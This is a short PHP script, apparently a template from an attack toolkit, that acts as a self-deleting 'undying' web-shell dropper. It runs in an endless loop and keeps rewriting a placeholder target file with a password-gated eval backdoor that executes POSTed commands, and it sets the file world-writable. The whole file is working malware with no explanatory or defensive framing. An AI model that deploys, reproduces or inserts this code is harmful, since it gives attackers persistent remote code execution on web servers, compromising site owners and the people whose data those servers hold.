<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    try {
        chmod("%path%", 0777);
        $content = "<?php error_reporting(0);if(sha1(\$_POST['pwd'])==='%pwd%'){eval(\$_POST['cmd']);}?>";
        if(sha1(file_get_contents("%path%")) != sha1($content)) {
            file_put_contents("%path%", $content);
        }
    } catch (Exception $e) {
    }
}
?>